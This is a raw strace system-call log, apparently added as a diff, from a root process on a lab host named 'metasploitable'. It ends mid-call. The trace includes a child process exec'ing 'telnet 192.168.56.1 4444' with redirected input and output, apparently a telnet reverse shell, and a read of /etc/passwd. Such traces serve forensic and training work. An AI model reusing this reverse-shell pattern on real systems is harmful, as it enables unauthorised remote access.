+[pid  6369] 22:01:44.901719 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 3
+[pid  6369] 22:01:44.901739 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  6369] 22:01:44.901760 fstat64(3, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  6369] 22:01:44.901793 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7ee5000
+[pid  6369] 22:01:44.901805 mmap2(0xb7ee7000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1) = 0xb7ee7000
+[pid  6369] 22:01:44.901824 close(3)    = 0
+[pid  6369] 22:01:44.901837 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.901854 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+[pid  6369] 22:01:44.901874 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6369] 22:01:44.901895 fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6369] 22:01:44.901927 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee4000
+[pid  6369] 22:01:44.901944 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d95000
+[pid  6369] 22:01:44.901956 mmap2(0xb7ede000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7ede000
+[pid  6369] 22:01:44.901974 mmap2(0xb7ee1000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ee1000
+[pid  6369] 22:01:44.901990 close(3)    = 0
+[pid  6369] 22:01:44.902018 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d94000
+[pid  6369] 22:01:44.902032 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d946b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6369] 22:01:44.902122 mprotect(0xb7ede000, 4096, PROT_READ) = 0
+[pid  6369] 22:01:44.902170 munmap(0xb7f19000, 29338) = 0
+[pid  6369] 22:01:44.902207 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:44.902226 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+[pid  6369] 22:01:44.902253 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd477f0) = -1 EINVAL (Invalid argument)
+[pid  6369] 22:01:44.902290 brk(0)      = 0x80f9000
+[pid  6369] 22:01:44.902301 brk(0x80fa000) = 0x80fa000
+[pid  6369] 22:01:44.902315 brk(0x80fb000) = 0x80fb000
+[pid  6369] 22:01:44.902339 getuid32()  = 0
+[pid  6369] 22:01:44.902349 getgid32()  = 0
+[pid  6369] 22:01:44.902359 geteuid32() = 0
+[pid  6369] 22:01:44.902369 getegid32() = 0
+[pid  6369] 22:01:44.902386 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:44.902404 time(NULL)  = 1478487704
+[pid  6369] 22:01:44.902418 brk(0x80fc000) = 0x80fc000
+[pid  6369] 22:01:44.902432 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd478f8) = -1 EINVAL (Invalid argument)
+[pid  6369] 22:01:44.902449 brk(0x80fd000) = 0x80fd000
+[pid  6369] 22:01:44.902477 open("/proc/meminfo", O_RDONLY) = 3
+[pid  6369] 22:01:44.902508 fstat64(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  6369] 22:01:44.902543 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f20000
+[pid  6369] 22:01:44.902556 read(3, "MemTotal:      4152252 kB\nMemFre"..., 1024) = 846
+[pid  6369] 22:01:44.902608 close(3)    = 0
+[pid  6369] 22:01:44.902620 munmap(0xb7f20000, 4096) = 0
+[pid  6369] 22:01:44.902633 brk(0x80fe000) = 0x80fe000
+[pid  6369] 22:01:44.902668 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.902688 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.902707 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:44.902726 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.902745 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:44.902765 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.902786 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:44.902800 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:44.902822 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  6369] 22:01:44.902936 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6369] 22:01:44.902970 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6369] 22:01:44.903005 getpid()    = 6369
+[pid  6369] 22:01:44.903024 getppid()   = 6368
+[pid  6369] 22:01:44.903044 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6369] 22:01:44.903081 stat64("/sbin/sh", 0xbfd477c8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.903097 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6369] 22:01:44.903131 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6369] 22:01:44.903180 socket(PF_FILE, SOCK_STREAM, 0) = 3
+[pid  6369] 22:01:44.903195 fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  6369] 22:01:44.903211 connect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.903254 close(3)    = 0
+[pid  6369] 22:01:44.903268 socket(PF_FILE, SOCK_STREAM, 0) = 3
+[pid  6369] 22:01:44.903279 fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  6369] 22:01:44.903292 connect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.903330 close(3)    = 0
+[pid  6369] 22:01:44.903346 open("/etc/nsswitch.conf", O_RDONLY) = 3
+[pid  6369] 22:01:44.903365 fstat64(3, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+[pid  6369] 22:01:44.903397 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f20000
+[pid  6369] 22:01:44.903409 read(3, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 475
+[pid  6369] 22:01:44.903436 read(3, "", 4096) = 0
+[pid  6369] 22:01:44.903446 close(3)    = 0
+[pid  6369] 22:01:44.903456 munmap(0xb7f20000, 4096 <unfinished ...>
+[pid  6368] 22:01:44.937594 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6365] 22:01:44.937649 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6369] 22:01:44.937669 <... munmap resumed> ) = 0
+[pid  6368] 22:01:44.937674 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6365] 22:01:44.937679 close(4 <unfinished ...>
+[pid  6369] 22:01:44.937721 open("/etc/ld.so.cache", O_RDONLY <unfinished ...>
+[pid  6368] 22:01:44.937734 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6365] 22:01:44.937743 <... close resumed> ) = 0
+[pid  6369] 22:01:44.937753 <... open resumed> ) = 3
+[pid  6368] 22:01:44.937758 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6365] 22:01:44.937766 close(5 <unfinished ...>
+[pid  6369] 22:01:44.937778 fstat64(3,  <unfinished ...>
+[pid  6368] 22:01:44.937784 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6365] 22:01:44.937793 <... close resumed> ) = 0
+[pid  6369] 22:01:44.937804 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6368] 22:01:44.937864 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6365] 22:01:44.937870 close(4 <unfinished ...>
+[pid  6369] 22:01:44.937880 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0 <unfinished ...>
+[pid  6368] 22:01:44.937887 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6365] 22:01:44.937905 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6369] 22:01:44.937916 <... mmap2 resumed> ) = 0xb7f19000
+[pid  6368] 22:01:44.937921 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6365] 22:01:44.937929 close(5 <unfinished ...>
+[pid  6369] 22:01:44.937938 close(3 <unfinished ...>
+[pid  6368] 22:01:44.937944 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
+[pid  6365] 22:01:44.937956 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6369] 22:01:44.937975 <... close resumed> ) = 0
+[pid  6368] 22:01:44.937979 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6365] 22:01:44.937989 rt_sigprocmask(SIG_BLOCK, [INT CHLD],  <unfinished ...>
+[pid  6369] 22:01:44.938006 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6368] 22:01:44.938018 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  6365] 22:01:44.938029 <... rt_sigprocmask resumed> [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6369] 22:01:44.938041 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6368] 22:01:44.938046 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  6365] 22:01:44.938062 clone( <unfinished ...>
+[pid  6369] 22:01:44.938123 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY <unfinished ...>
+[pid  6368] 22:01:44.938141 waitpid(-1, Process 6368 suspended
+Process 6370 attached
+ <unfinished ...>
+[pid  6365] 22:01:44.938150 <... clone resumed> child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e276f8) = 6370
+[pid  6369] 22:01:44.938188 <... open resumed> ) = 3
+[pid  6370] 22:01:44.938193 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6369] 22:01:44.938205 read(3,  <unfinished ...>
+[pid  6370] 22:01:44.938210 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6369] 22:01:44.938224 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\000"..., 512) = 512
+[pid  6370] 22:01:44.938240 rt_sigaction(SIGTSTP, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.938254 fstat64(3,  <unfinished ...>
+[pid  6370] 22:01:44.938260 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.938272 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+[pid  6370] 22:01:44.938299 rt_sigaction(SIGTTIN, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.938314 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6370] 22:01:44.938320 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.938334 <... mmap2 resumed> ) = 0xb7d8b000
+[pid  6370] 22:01:44.938339 rt_sigaction(SIGTTOU, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.938352 mmap2(0xb7d92000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6 <unfinished ...>
+[pid  6370] 22:01:44.938359 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.938417 <... mmap2 resumed> ) = 0xb7d92000
+[pid  6370] 22:01:44.938422 dup2(3, 0 <unfinished ...>
+[pid  6369] 22:01:44.938438 close(3 <unfinished ...>
+[pid  6370] 22:01:44.938444 <... dup2 resumed> ) = 0
+[pid  6369] 22:01:44.938451 <... close resumed> ) = 0
+[pid  6370] 22:01:44.938455 close(3 <unfinished ...>
+[pid  6369] 22:01:44.938466 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6370] 22:01:44.938478 <... close resumed> ) = 0
+[pid  6369] 22:01:44.938544 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6370] 22:01:44.938551 stat64(".",  <unfinished ...>
+[pid  6369] 22:01:44.938562 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY <unfinished ...>
+[pid  6370] 22:01:44.938576 <... stat64 resumed> {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6369] 22:01:44.938610 <... open resumed> ) = 3
+[pid  6370] 22:01:44.938615 stat64("/sbin/telnet",  <unfinished ...>
+[pid  6369] 22:01:44.938628 read(3,  <unfinished ...>
+[pid  6370] 22:01:44.938634 <... stat64 resumed> 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.938644 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\000"..., 512) = 512
+[pid  6370] 22:01:44.938659 stat64("/bin/telnet",  <unfinished ...>
+[pid  6369] 22:01:44.938671 fstat64(3,  <unfinished ...>
+[pid  6370] 22:01:44.938676 <... stat64 resumed> 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.938684 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+[pid  6370] 22:01:44.938711 stat64("/usr/sbin/telnet",  <unfinished ...>
+[pid  6369] 22:01:44.938726 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6370] 22:01:44.938732 <... stat64 resumed> 0xbf962d88) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.938741 <... mmap2 resumed> ) = 0xb7d73000
+[pid  6370] 22:01:44.938746 stat64("/usr/bin/telnet",  <unfinished ...>
+[pid  6369] 22:01:44.938761 mmap2(0xb7d87000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13 <unfinished ...>
+[pid  6370] 22:01:44.938768 <... stat64 resumed> {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  6369] 22:01:44.938800 <... mmap2 resumed> ) = 0xb7d87000
+[pid  6370] 22:01:44.938805 stat64("/usr/bin/telnet",  <unfinished ...>
+[pid  6369] 22:01:44.938822 mmap2(0xb7d89000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6370] 22:01:44.938829 <... stat64 resumed> {st_mode=S_IFREG|0755, st_size=77504, ...}) = 0
+[pid  6369] 22:01:44.938869 <... mmap2 resumed> ) = 0xb7d89000
+[pid  6370] 22:01:44.938875 rt_sigaction(SIGINT, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.938892 close(3 <unfinished ...>
+[pid  6370] 22:01:44.938897 <... rt_sigaction resumed> {0x8091fd0, [], 0}, 8) = 0
+[pid  6369] 22:01:44.938911 <... close resumed> ) = 0
+[pid  6370] 22:01:44.938916 rt_sigaction(SIGQUIT, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.938956 munmap(0xb7f19000, 29338 <unfinished ...>
+[pid  6370] 22:01:44.938962 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.938977 <... munmap resumed> ) = 0
+[pid  6370] 22:01:44.938982 rt_sigaction(SIGCHLD, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.939003 open("/etc/ld.so.cache", O_RDONLY <unfinished ...>
+[pid  6370] 22:01:44.939014 <... rt_sigaction resumed> {0x807e540, [], 0}, 8) = 0
+[pid  6369] 22:01:44.939029 <... open resumed> ) = 3
+[pid  6370] 22:01:44.939034 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  6369] 22:01:44.939046 fstat64(3,  <unfinished ...>
+[pid  6370] 22:01:44.939051 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.939063 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6370] 22:01:44.939090 rt_sigaction(SIGQUIT, {SIG_IGN},  <unfinished ...>
+[pid  6369] 22:01:44.939103 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0 <unfinished ...>
+[pid  6365] 22:01:44.974906 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.975441 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:44.976314 <... mmap2 resumed> ) = 0xb7f19000
+[pid  6365] 22:01:44.976371 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:44.976411 open("/dev/null", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666 <unfinished ...>
+[pid  6369] 22:01:44.976487 close(3 <unfinished ...>
+[pid  6365] 22:01:44.976500 close(3 <unfinished ...>
+[pid  6370] 22:01:44.976510 <... open resumed> ) = 3
+[pid  6369] 22:01:44.976531 <... close resumed> ) = 0
+[pid  6365] 22:01:44.976537 <... close resumed> ) = 0
+[pid  6370] 22:01:44.976542 dup2(3, 1 <unfinished ...>
+[pid  6369] 22:01:44.976567 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6365] 22:01:44.976580 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.976589 <... dup2 resumed> ) = 1
+[pid  6369] 22:01:44.976597 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6365] 22:01:44.976604 <... rt_sigprocmask resumed> [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6370] 22:01:44.976612 close(3 <unfinished ...>
+[pid  6369] 22:01:44.976630 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY <unfinished ...>
+[pid  6365] 22:01:44.976645 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.976653 <... close resumed> ) = 0
+[pid  6369] 22:01:44.976666 <... open resumed> ) = 3
+[pid  6365] 22:01:44.976670 <... rt_sigprocmask resumed> [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6370] 22:01:44.976678 dup2(1, 2 <unfinished ...>
+[pid  6369] 22:01:44.976687 read(3,  <unfinished ...>
+[pid  6365] 22:01:44.976693 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.976701 <... dup2 resumed> ) = 2
+[pid  6369] 22:01:44.976719 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0"..., 512) = 512
+[pid  6365] 22:01:44.976735 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:44.976740 fcntl64(1, F_GETFD <unfinished ...>
+[pid  6369] 22:01:44.976752 fstat64(3,  <unfinished ...>
+[pid  6365] 22:01:44.976758 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.976766 <... fcntl64 resumed> ) = 0
+[pid  6369] 22:01:44.976780 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+[pid  6365] 22:01:44.976807 <... rt_sigprocmask resumed> [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6370] 22:01:44.976816 execve("/usr/bin/telnet", ["telnet", "192.168.56.1", "4444"], [/* 15 vars */] <unfinished ...>
+[pid  6369] 22:01:44.976935 brk(0x80ff000 <unfinished ...>
+[pid  6365] 22:01:44.976942 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.976951 <... execve resumed> ) = 0
+[pid  6369] 22:01:44.976960 <... brk resumed> ) = 0x80ff000
+[pid  6365] 22:01:44.976964 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6369] 22:01:44.976990 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6365] 22:01:44.976998 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.977007 brk(0 <unfinished ...>
+[pid  6369] 22:01:44.977016 <... mmap2 resumed> ) = 0xb7d69000
+[pid  6365] 22:01:44.977021 <... rt_sigprocmask resumed> [FPE USR2 PIPE CHLD], 8) = 0
+[pid  6370] 22:01:44.977029 <... brk resumed> ) = 0x805d000
+[pid  6369] 22:01:44.977055 mmap2(0xb7d71000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7 <unfinished ...>
+[pid  6365] 22:01:44.977062 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.977071 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6369] 22:01:44.977088 <... mmap2 resumed> ) = 0xb7d71000
+[pid  6365] 22:01:44.977093 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:44.977098 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.977115 close(3 <unfinished ...>
+[pid  6365] 22:01:44.977121 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE CHLD],  <unfinished ...>
+[pid  6370] 22:01:44.977131 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6369] 22:01:44.977140 <... close resumed> ) = 0
+[pid  6365] 22:01:44.977145 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:44.977150 <... mmap2 resumed> ) = 0xb7fbe000
+[pid  6369] 22:01:44.977174 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6365] 22:01:44.977185 close(3 <unfinished ...>
+[pid  6370] 22:01:44.977191 access("/etc/ld.so.preload", R_OK <unfinished ...>
+[pid  6369] 22:01:44.977206 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6365] 22:01:44.977211 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6370] 22:01:44.977216 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:44.977232 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY <unfinished ...>
+[pid  6365] 22:01:44.977248 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6370] 22:01:44.977257 open("/etc/ld.so.cache", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:44.977273 <... open resumed> ) = 3
+[pid  6365] 22:01:44.977278 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:44.977282 <... open resumed> ) = 3
+[pid  6369] 22:01:44.977376 read(3,  <unfinished ...>
+[pid  6365] 22:01:44.977382 exit_group(0) = ?
+Process 6364 resumed
+Process 6365 detached
+[pid  6370] 22:01:44.977391 fstat64(3,  <unfinished ...>
+[pid  6364] 22:01:44.977431 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6365
+[pid  6369] 22:01:44.977439 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30"..., 512) = 512
+[pid  6370] 22:01:44.977455 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6364] 22:01:44.977495 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6369] 22:01:44.977504 fstat64(3,  <unfinished ...>
+[pid  6370] 22:01:44.977510 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0 <unfinished ...>
+[pid  6364] 22:01:44.977520 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6369] 22:01:44.977525 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+[pid  6370] 22:01:44.977551 <... mmap2 resumed> ) = 0xb7fb6000
+[pid  6364] 22:01:44.977560 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6369] 22:01:44.977571 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6370] 22:01:44.977578 close(3 <unfinished ...>
+[pid  6364] 22:01:44.977590 waitpid(-1,  <unfinished ...>
+[pid  6369] 22:01:44.977595 <... mmap2 resumed> ) = 0xb7d5e000
+[pid  6370] 22:01:44.977600 <... close resumed> ) = 0
+[pid  6364] 22:01:44.977611 <... waitpid resumed> 0xbf962f38, WNOHANG) = -1 ECHILD (No child processes)
+[pid  6369] 22:01:44.977618 mmap2(0xb7d67000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x8 <unfinished ...>
+[pid  6370] 22:01:44.977624 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6364] 22:01:44.977642 sigreturn( <unfinished ...>
+[pid  6369] 22:01:44.977667 <... mmap2 resumed> ) = 0xb7d67000
+[pid  6370] 22:01:44.977672 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6364] 22:01:44.977693 <... sigreturn resumed> ) = ? (mask now [FPE USR2 PIPE])
+[pid  6369] 22:01:44.977699 close(3 <unfinished ...>
+[pid  6370] 22:01:44.977704 open("/lib/libncurses.so.5", O_RDONLY <unfinished ...>
+[pid  6364] 22:01:44.977722 rt_sigaction(SIGINT, {SIG_DFL},  <unfinished ...>
+[pid  6369] 22:01:44.977733 <... close resumed> ) = 0
+[pid  6370] 22:01:44.977737 <... open resumed> ) = 3
+[pid  6364] 22:01:44.977763 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  6369] 22:01:44.977775 munmap(0xb7f19000, 29338 <unfinished ...>
+[pid  6370] 22:01:44.977781 read(3,  <unfinished ...>
+[pid  6364] 22:01:44.977839 exit_group(0) = ?
+Process 6363 resumed
+Process 6364 detached
+[pid  6369] 22:01:44.977847 <... munmap resumed> ) = 0
+[pid  6370] 22:01:44.977852 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  6363] 22:01:45.015838 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6364
+[pid  6369] 22:01:45.015858 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */ <unfinished ...>
+[pid  6370] 22:01:45.015904 fstat64(3,  <unfinished ...>
+[pid  6363] 22:01:45.015911 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6369] 22:01:45.015922 <... open resumed> ) = 3
+[pid  6370] 22:01:45.015938 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  6363] 22:01:45.015967 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6369] 22:01:45.015972 fcntl64(3, F_GETFD <unfinished ...>
+[pid  6370] 22:01:45.015985 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6363] 22:01:45.015992 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6369] 22:01:45.015999 <... fcntl64 resumed> ) = 0x1 (flags FD_CLOEXEC)
+[pid  6370] 22:01:45.016013 <... mmap2 resumed> ) = 0xb7f86000
+[pid  6363] 22:01:45.016018 waitpid(-1,  <unfinished ...>
+[pid  6369] 22:01:45.016024 _llseek(3, 0,  <unfinished ...>
